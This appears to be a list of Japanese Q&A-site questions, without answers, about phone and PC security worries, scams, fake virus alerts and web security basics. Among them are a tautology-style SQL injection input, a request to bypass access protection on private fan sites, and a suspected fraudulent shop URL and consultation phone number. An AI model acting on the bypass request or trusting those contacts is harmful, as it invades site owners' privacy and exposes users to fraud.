アプリインストールしたことで個人情報を取得できますか？ 6 2ヶ月たちましたが、何も起こってません。これから何も起こりませんか？ 質問多くてスミマセン。ですが、夜も眠れないほど不安なので、 できるだけ早く教えていただきたいです。 また、質問についてご不明な点がありましたら 教えてください。 私は未成年なので スマホのことはよくわかりません。 詳しく教えていただくと有り難いです。 早めのご回答をお待ちしております…。
JRの運行システムちなみに都内です。ネットワークは専用回線でマニアックに見れないのか詳しい方に質問です。JRの運行システムちなみに都内です。ネットワークは専用回線でマニアックに見れないのか詳しい方に質問です。
【500枚ご進呈】とても困っています。突然起動するときにサインイン画面がPWを求められるようになりました。ですが、こんな設定をした覚えはありません。このMichrosoftサインインだのMaicrosoftアカウントだの面倒臭いものを拒否して使いたのですがどうすればいいのでしょう。 今までこんなことに悩まされた覚えはありません。 セキュリティーに甘いと思われるかもしれませんが、ずっとそうやって使ってきました。 自分以外の人間がPCを触ることなど絶対にありえない環境なのです。 なので一々電源入れるたびにPWなど要求されるのは生理的にとても不快なのです それ以前に今、サインインが出て来てしまうことに困っています。 PCの電源ボタンを入れてあとはデスクトップ画面が出て来るのを待つだけといった元の使い方に戻したいのですが、どうしたらいいのでしょう。 原因として思い付くのは、 Windows10でOutlookExressみたいなメールソフトがなかったので、スタート画面からメールを選んでマイクロソフトOUTLOOKというものを使えそうなので設定したら、電話番号を入れてくれだのpwを入れてくれだの出て来た覚えがあります。 勿論そのＰＷはいつも使ってるもので設定しましたが、それを入れても違ってますと返ってくるのです。 思い付く限りに入れてみましたが分からずじまいで最後に使ったPWを代わりに入れて下さいと表示されたのでようやく思い付いてサインインできました。 いまはもうシャットダウンするのが怖いくらいです。 Michrosoftアカウントなど私には一切用はありません。Microsoft Outlookなど使えなくてもいいです。他にいくらでも手段はありますから。 因みに普段頻用するのはブラウザはChromeで、メールはG-MailかWebのフリーメールなどです。 環境は、 Lenovo デスクトップ FTTH Windows10 IEのバージョンは11です。 よろしくお願い致します。m(_ _)m 自宅でデスクトップPCを使っております。
Yahoo!アカウントに海外からのアクセス履歴があったのですが、どういうことでしょう。また、どうするのが良いのでしょうか？
また、メリット ピュアンについて質問があります。ネットでは 2種類でしたし 2種類であると 教えて頂いたのですが、、 よくもう一度調べてみると シャイニーブーケという香りで 売っているみたいなのです。 ですが、やはり メリットの公式ホームページには 載っていませんでした。 なぜなのでしょうか？？ よく調べた時に載っていた 写真も載せます。
一か月前にツイッターのアカウントを削除したのですが、ネットで検索すると出てきます。 これは時期に消去されるんでしょうか？ キャッシュで表示すると一部まだ見れちゃいます。
世界 日本で一番セキュリティ高いのはなんですか
友人の携帯が、その友人の会社の同僚に覗かれている様です。 携帯を見てないと、わからない様なプライベートな話を知られていたり、おかしな感じがしたので、携帯を変えたみたいですが、すぐまた覗かれている形跡があるそうです。 例えば、新しい彼女の携帯は、ゲスト機能があるのですが、ゲストに切り替えるパスワードがいつも解除されている、また、ゲストに切り替えたら、起動した覚えのないカメラが起動していた、など。 妄想など、彼女に、精神的に何か問題がある様には見えません。また、彼女の会社はITセキュリティの会社で、そういった話に詳しい人が沢山います。優秀な技術者は、優秀なハッカーにもなれるのをよくわかっているから、余計に怖いみたいです。 どうすればいいでしょうか？過去の経験から、警察に行っても相手にされない気がして。アドバイスお願いします。
PS4のネットをSOFT BANKAir2で繋いでいるものです。通信速度を2.4GHz帯から 5GHz帯に切り替えたいのですがやり方が わかりません。どなたかご存知の方 いらっしゃいましたら教えてください。
消費者センターについて質問です。 ただただマヌケな質問ですが、 優しい回答お願いしますm(._.)m ワンクリック詐欺かな？と思い、ネットで 消費者センターを検索し、広告とかかれた 消費者センターのページを開きました。 電話番号は0120428160で、 電話して相談しようと思ったのですが、 電話したところ、専門家が電話中で 折り返すと言われました。 しかし、数日経っても連絡はなく、 再度検索しましたが、検索の仕方が悪いのか、 相談した消費者センターのサイトが ありません。 なので、私の電話番号と名前を相手に伝えて しまっただけの状態です(>_<) 後で色々と調べたら、 ワンクリック詐欺の対応は、 自分に害が無い（アダルトサイトでいうと料金請求画面が消えないなど）場合は 何もしなくてもよい、というか何もしないのが正しいとのことでした。 そこで、質問です。 現在、私はどういう状態にあるのでしょうか？ どうすべきですか？ 相談した消費者センターは何だったのでしょうか？ とても不安です！ 安心できる優しい回答お願いします(つД`)ノ
スマートフォンの添付データ上に広告表示されることはありますか？メールに添付されたエクセルデータを閲覧中に広告が出てくるようになってしまいました。 先程会社から送られてきたエクセルデータを開いたところ、 突然下にバナー広告が出てきてビックリしました。 社外秘情報を含むデータも入っている会社の携帯なので心配しています。 特に問題ないのでしょうか・・・。
コンピュータのプロパティから見た「コンピュータ名」と、ネットワークと共有センターから見た「このコンピュータ」の名前がまったく違っています。今までそんことはなったのですが、昨日会社のNASの設定確認作業中に気づいたら変わっていました。 『Buffalo NAS Navigator2』というソフトをCDからインストールしたからかな？と思ってアンインストールしてみましたが変わりません。 BaffoloのWeb Access というのも利用しましたが、関係あるでしょうか。 それ以外、何をどうしたから変わってしまったか自分でもわからず行き詰まっています。逆にどんな時にこのようなことが起こり得るのか教えていただけないでしょうか。 ちなみに社内で7台のPCを使用していて、名前が変わってしまったのは作業していたPC1台のみ（有線接続）です。 OS：Windows7 ネットワークの場所：ホームネットワーク ワークグループ：WORKGROUP NAS：Buffalo LS410D 足りない情報があったらご教授いただけると助かります。 初心者でつたない質問ではありますが、よろしくお願い致します。
teamviewerを使ってｐｃを遠隔操作されました。マイドキュメントやメールなども見られたり、情報が読み取られるのでしょうか。
ギターのエフェｌクターを探しています。 ネットのとあるサイトでほかよりも安めなのを見つけました。 そこで購入しようかと手続きを進めましたが、何か引っかかるものを感じました。サイトの作りが甘かったり、 送金方法がクレジットとか銀行振り込みとかいろいろ選択できる風なことを書いているのに 結局銀行振り込みだけしか対応していなかったり、 振込先の名義が中国人だったり(失礼、すみません) サイトURL http://www.musicalinstrumentsby.top/-ezp-27.html ここって信用しても大丈夫だと思いますか？ 現在お金を振り込む前の段階です。 ここで買い物された方っていらっしゃいますか？ 社名で検索したら偽サイトらしい情報がありました。 これって完全にクロですかね？ http://www.neo-blood.co.jp/2016-6-11/ 偽サイト「店名：株式会社アイズフス」(更新：6月12日) 一かい振り込んで人柱になってみましょうか？（笑
掲示板などへの意図しない書き込み（クロスサイトリクエストフォージェリ（CSRF）による意図しない書き込み）などを防ぐにはどうしたらいいですか？ちょっと前に世間で話題になった、いわゆる「パソコン遠隔操作事件」ですが、匿名掲示板への意図しない犯罪予告の書き込みにより逮捕されてしまった人たちの中には、リンクを踏んだだけで事件に巻き込まれてしまった人もいるそうです。 報道によると、その方は、犯人側が用意したリンクをクリックしアクセスしたところ、自分のパソコンから匿名掲示板に犯罪予告が書き込まれてしまい、結局事件に巻き込まれてしまったそうです。 そこで質問です。 ｛質問｝ ①クロスサイトリクエストフォージェリ（CSRF）による匿名掲示板などへの意図しない書き込みを防ぐ対策ってあるのでしょうか？ 一応、それなりにマルウェア検知率が評価されているセキュリティ対策ソフトを使っています。また、ブラウザやOS、プラグインなどもできるだけ早くアップデート（脆弱性対策）しています。これでも根本的に防ぐことができないでしょうか？ ②仮に、意図しない書き込みがなされてしまった場合は、目に見えてわかるような動き（画面の表示）があるのでしょうか？ …大学のレポート作成のために、頻繁に見知らぬウェブサイトやブログ、それに海外のサイトなどにもアクセスしているので、いつか巻き込まれてしまうのではと危惧しています。 対策があれば、お教えいただきたいと思います。よろしくお願いします。
日本国内で中国人に道を聞かれた際に、その中国人が持っていたスマホの地図では目的地周辺の一部しか表示されなかったので、私のスマホ(Android)でもっと広い範囲を表示させようとGoogleマップで地名を入力して検索したところ、表示されたのはほとんどが中国の地名・・・。ひょっとしてこの中国人のスマホから変なデータを受けてしまったのではないかと心配なのですが、放っておいても大丈夫でしょうか？ちなみに検索した地名は「大青田」です。
ご質問があります。 PCからセキュリティを一時外さなければならない状態、購入時やセキュリティの入れ替え、新規セキュリティを入れるときなど、やはり外す=すぐにウイルス感染すると言うことなんでしょうか？ 一体どれくらいの時間や日にちまで、繋いでおいても大丈夫なんでしょうか？ 作業ができなくて悩んでいます。詳しい方づうか、解答の方、宜しくお願い致します。
Microsoft EdgeでYSfinderというサイトを開いたところ、写真の様な画面が表示されました。 YSfinderは良く利用するサイトなのですが、普段はこのような画面は表示されません。ウイルスなどがPC内に侵入した恐れはあるのでしょうか？サイトが原因なのでしょうか？それともそれ以外に何か原因があるのでしょうか？今のところウイルスが侵入した形跡は見られませんが、心配になったので質問させていただきました。 ご回答よろしくお願い致します。
iPhone 6がおかしいです。家のwifiを使ってiPhone をつけると10秒ほどで強制的にリンゴマークに戻りその後、パスコード画面に戻ってしまいます。WiFiを切り、LTEでつけると通常作動します。 この現象が起こり始める10分ほど前にノートパソコンで同じWiFiを使って調べ物をしていた時、「外部からパソコンの設定を変えようとしています。許可しますか？」みたいなのが出て、許可しなければ動かない状態に陥ったので仕方なく許可すると、しばらくしていきなり画面が英文が書かれたモノに強制的に変わり、動かなくなったので再起動するということがあったのですがこれは一連の流れとして関連性はあるのでしょうか。 パソコンに詳しくないのですが勝手に許可したせいでwifiがウイルスに侵された？ということなんでしょうか。 アパートで一人暮らしなのですが、共用WiFiなので他の住人に迷惑がかかっていないか心配です。また、学生という身分上良くも悪くもネットをよく使うので至急解決したい問題です。詳しい方アドバイスお願いします。
モデムとＰＣの間にルーターを 挟んだら不正アクセスされにくいの でしょうか？
私(高2)が通っている高校は校則でバイトが禁止されてます。(ばれたら停学か退学です)しかし、9月までにミラーレスカメラ(2〜3万円ほどの)が欲しいのでお金が必要です。(文化祭や研修旅行などの行事で撮るため)月のお小遣いは7000円ほどです。現在、財布には7000円ほどありますがあと少しで夏休みなので結構使う可能性があります。 そこで、ネットで稼げるアンケートモニターをしようと思っているのですが、現金を貰えるまでの仕組みがよく分かりません。ネットの口座(楽天銀行など)を開設した場合、そこからどうやって現金を貰えるのかがよく分かりません。ちなみに中国銀行に口座があります。 あと一つ質問させてもらいます。 目星をつけているアンケートモニターのサイトは、 ・ライフメディア ・マクロミル ・D STYLE WEB ・infoQ ・キューモニター などです。(楽天銀行へ対応しているサイトを選びました。この他にオススメのサイトがあれば教えて下さい) これらのサイトの安全性や仕組み、WEBアンケートを答えるなどして月どれくらい稼げるかの目星などを出来たら教えて貰いたいです。 長文、悪文で読みにくいと思いますがよろしくお願いします。
ネットサーフィン中に、 ウィルスを検出 の画面が出てきました。 添付した画像のOKを押し、 そのまま今すぐスキャンというボタンを押してしまいました。途中ですぐにスキャンを停止しました。（バー３分の１くらいのところで） 嘘の警報なのだろうと思うのですが、 スキャンを少し押してしまったのが心配です。。 ちなみに前回訪問したサイトは"にころぐ"で、有害なサイトとは思えないのですが。 普段ネットでクレジット決済などするので不安です。 何か確かめる方法があればみなさんのお知恵をかしてください。
一昨年かその辺にテレビ番組でやってたのですが、何処からクラッキングされてるかを監視してるシステムの名前を忘れてしまいました。どなたか覚えてる方or知ってる方教えてください！ 特徴としては ・近未来的なインターフェース ・主に企業のサーバーをクラッキングから守っている こんな感じです。
旧パソコン VISTA から 新パソコン ＯＳ10 にデータ移行したいです。 裸族のお立ち台から データ移行しようとしたら ネットで不可能とありました。 モニターは、一つです。データ移行の方法をお願いします。 なお、私はパソコン素人です。 よろしくお願いします。
antimalware service executableを停止または削除したい。現在デルのノートPC、17SE（Corei7 2.40G)という機種で音楽作成していますが、必ず上記サービスがCPUを100％占有する瞬間があり、非常に不愉快です。 なんとか上記サービスを削除したく、ネットを検索しましたがドンピシャの回答が見当たりません。どなたか助けてくださいませんか？ よろしくお願いします。本当に困っています。 恐らくWindowsDefenderをどうにかするべきなのでしょうけども分かりません。
野宿って危険ですか？自分は男です。
Web初心者です。 SQLインジェクション対策について教えて下さい。 混乱中です。①web画面からの入力値：'a' = 'a' ②DB登録値：''a'' = ''a'' ③画面主力値：''a'' = ''a'' web画面から入力された「'a' = 'a'」を置換後にDBに登録する その後、DBに登録値を使用して画面に表示する。 表示した場合の結果は、''a'' = ''a''となる？？ htmlの置換を実施した場合 ④入力値：<strong>HTMLの特殊文字列</strong> ⑤DB値：<strong>HTMLの特殊文字列</strong> ⑥出力値：<strong>HTMLの特殊文字列</strong> htmlの置換の場合は、④入力値と⑥出力値は変わりません。 しかし、SQLインジェクション対策を実施すると web画面からの①入力値と②DB登録値、③画面主力値は変わってしまって良いのでしょうか？ 教えて下さい。 宜しくお願い致します。
SECCONについて質問です 自分は大学の工学部で情報工学をやっているのですが、セキュリティ関係に興味を持ちました。そこでSECCONについて知ったのですが、SECCONに出場してそこそこの結果を残すにはどのような勉強をすればよいのでしょうか？ C言語やJAVAなどをつかってソフトを作ったことはあるのですがセキュリティやネットワークについてはよくわかっていません。詳しい方、回答お願いします。
家のWi-Fiについて質問です。うちではキューブ型のWi-Fiを使っています。昨日急にネットが使えなくなりました。Wi-Fiのマークもついているのにネットが使えません。どうしてですか？どうやったら使えるようになりますか？ たなみにこれです。
出張撮影についてです。カメラマンについてあまり詳しくないので、質問させてください。 このたび、家族写真が撮りたくて、出張撮影を頼むことにしました。 安かったので、ココロカラフルという会社に頼もうと思っているのですが、出張撮影というのは、怖いことが起こらないか心配です。 今までスタジオアリスなど、大手の会社しか使ってこなかったので、特に心配してなかったのですが、 例えば、ネットに撮った写真を勝手に載せられるとか、約束の時間になってもこない、とかです。 考えすぎでしょうか。 よろしくおねがいします。
出張撮影についてです。カメラマンについてあまり詳しくないので、質問させてください。このたび、家族写真が撮りたくて、出張撮影を頼むことにしました。 安かったので、ココロカラフルという会社に頼もうと思っているのですが、出張撮影というのは、怖いことが起こらないか心配です。 今までスタジオアリスなど、大手の会社しか使ってこなかったので、特に心配してなかったのですが、 例えば、ネットに撮った写真を勝手に載せられるとか、約束の時間になってもこない、とかです。 考えすぎでしょうか。 よろしくおねがいします
XAMPPは開発環境用でしか使えないのでしょうか？ ネットで調べると、XAMPPは開発環境用であると、公式サイトがアナウンスしていると紹介するブログの記事がありましたが、ソースがみつかりません。 以前はアナウンスしていたのでしょうか？経緯をご存じでしたら教えてほしいです。 また、XAMPPでインストールしたApache,MySQL,PHPはそれぞれ後から設定変更できると思うのですが、XAMPPを使わず、単体でインストールしないと設定できない項目はあるのでしょうか？ XAMMPを使うことで制限される機能があれば教えてほしいです。
同人業界における検索避けの進化版、忍者サンドボックスや忍者バリアーについて ツイッターの鍵垢のつぶやきを見る方法は調べればすぐ出ますがこのサービスに守られたサイトを閲覧するのは一筋縄ではいきません。とはいえ人間が作ったシステムである以上、脆弱性は必ずあるでしょう。見たいものは見たいのです。どうか見る方法を教えてください。 公の場で情報を上げるサイトマスターがあくまで悪いんですよね。。。
プライバシーマークを取得したいのですが… ITベンチャーで総務を担当していますこのたび弊社でプライバシーマークの取得をしようという動きが出てきておりまして、プライバシーマークの取得は総務が担当するということで勉強中の身です ネットで調べると自社取得には相当な工数が必要なようで、コンサル会社に依頼した方が通常の業務に支障なく取得ができるそうです そこで質問です、プライバシーマークの取得のためにコンサル会社を利用された方はいらっしゃいませんか？ 高いところでは100万を超える費用がかかるようなので、できることなら自社取得を目指したいのですが…
前々回の質問からなのですが、 中国語名のついたフォルダが自動生成されるのですが中身はadhoc_CLIENT_IDです、開くと英数字の組み合わせのもの収納されています (最近気付いたのですが自動生成される間隔かまちまちです、もしかしたら相手側がファイルの削除を何らかの形で知り手動で生成しているのか、可能性はありませんか？) あと、中国サイト(百度とか)に行き(行くのは自己責任とはわかっていますが3年近く利用して初めてです)ファイルを取得した場合そちらからウィルスまがいのモノがスマホに入る可能性はあるのでしょうか？ ちなみに、端末内に中国アプリは入っていません。 セキュリティーソフトには反応しません。 以上よろしくお願い致します。 何も害がないのであれば放置するのですが。 完全解決を望んでいます、解決方法を提示下さる方にお礼をします。
webdavのセキュリティ対策について ファイルサーバなので考えられることはウイルスを共有ディレクトリに上げることが考えられます。そのため、clam antivirusをインストールしたいと思います。 上の対策はこれだけで大丈夫でしょうか? また、他にどんな攻撃があるか教えてください。 他に対策はユーザ入力があるものはサニタイジング、盗聴対策としてhttpsのみでアクセスできるようにしてます。
洋風の庭に敷く砂利の名前？種類？を知りたいのですが。写真は、今、敷いているものです。 玉砂利だったと思うのですが。 楕円のものも多く、長さは、長くて３０mm幅は、ひろくて2.5mmでした。 サイズもわかりませんか？ 実は、先日、購入したホームセンターにも近所のホームセンターにも売ってなかったので、玉砂利 30mmピンク系をネットで購入しましたが、 庭の石の長さを測って、30mmと発注したのですが、届いたものは、最小が30mmで最大は50mmくらいありました。 敷くと和風になりました⤵︎ 問い合わせましたが、30mmのふるいで、選別してますとの応えでしたので、大きい石の混じっている理由もよくわかりません⤵︎ 何かおわかりになる方、教えて下さい
Googleアカウントは本名でも問題ないでしょうか。 偽名でも問題ないと、ほかの質問で見ました。本名でも、たとえば、ＹＯＵＴＵＢＥを利用する場合、そのチャンネルを作り（そこで、ニックネームを使って）利用するので、問題ないでしょうか。 Googleアカウントが本名でも、それぞれに別のニックネームを付ければ大丈夫ですか？
検索した憶えのない単語が出てきたのですが原因は何でしょうか？私はネット検索にYahoo!Japanを使っているのですが、先ほど検索した憶えのない単語がホーム画面の検索欄に表示されたのです。ネットを使っている最中にホーム画面にブラウザバックをしたらいきなりです。 今までこんなことはなかったので不安になりました。私はPCにあまり詳しくないので設定がどうなっているのかわかりませんが、ホームに戻っても前に検索した単語が検索欄に残る状態になっているので、もしかしたら誰かが勝手に同時にアクセス出来ているのではないかと思ってしまいます。検索履歴にはまだ憶えのないものは無いのですが問題は無いのでしょうか？回答お願いします。 ちなみに検索欄にあったのは、「ハーグ 形成中央」という薄毛治療のものでした。「ハーメルン」と検索したことはあるのですが関係ありますか？（最初の２文字が同じ）
Lineで、送った覚えの無いメッセージが知人に送られていて、困っています。メッセージの内容は、ヤフートピックスの記事のアドレスです。友達全員ではなく、3人に送られていました。そのヤフートピックスの記事は見た覚えが無く、訳わかんないです。原因とか 対処方法教えて下さい。その時間はウォーキングしててポケットにスマホを入れていました。勝手に画面触ってしまったのでしょうか？
macのdnsサーバで数字とアルファベットとコロンで構成されているものがあるのですがセキュリティ的に大丈夫ですか？四桁もしくは三桁で数字とアルファべットが混ざった文字列 コロンが一つで文字列が区切られている時もあれば２つで区切られている時もあります
誰か助けてください。 ネットを見るたびに表示される広告で電子漫画の広告は嬉しいのですが、見た覚えもないBL物がほぼ必ず表示されて嫌になります。 気持ち悪いので非表示にできる方法はありませんか？
日本では数年前に大掛かりなPC遠隔操作による冤罪事件等を引き起こしたとして片山祐輔が脚光を浴び、懲役８年の刑とされたようですが、アメリカでもコンピューター犯罪によって逮捕されコンピューターの世界から隔離された有名な人がいたように記憶しているのですが、何と言う人だったのか、名前が思い出せません。誰でしたっけ？
オープンリペアに修理を頼んだのですが、キャンセル料は払わなくてはいけないんですか？ 他のネットの評判など見て怖くなってしまい、キャンセルしたいです。
ファイルマネージャーを見ていたら『Crystal Express Global』というファイルがありました。ネットで検索してみても何に関するファイルなのか分かりません。 削除して良いものでしょうか？
覚えのない「アダルト動画サイト」に有料登録されてしまいましたが 「無視」していても構わないでしょうか？。 ネットにつないでいると、頻繁に「登録完了」のお知らせが入ります。
自分の名前をネットで検索したら、画像のとこに4年前にやってたTwitterのアイコンだった自分のプリクラがでてきて、4年前に登録してそのままだったTwitterも検索結果のいちばんうえにでてくるんですけど、どちらともどうやったら消えるんでしょうか？？ ちなみに携帯を変えてメアドも変えてパスワードも覚えていないので前のTwitterにはログインできません、、
iPhoneの、App Storeからアプリをダウンロードする時などに必要な、IDとパスワードのアカウントを削除したいのですが、 どうしたらできますか？？ やり方を詳しく、簡単に教えてください…！
Advancedとは何でしょうか？ 3112システムの問題がみつかりました。と警告が出ました。 修理を開始してもいいのでしょうか？
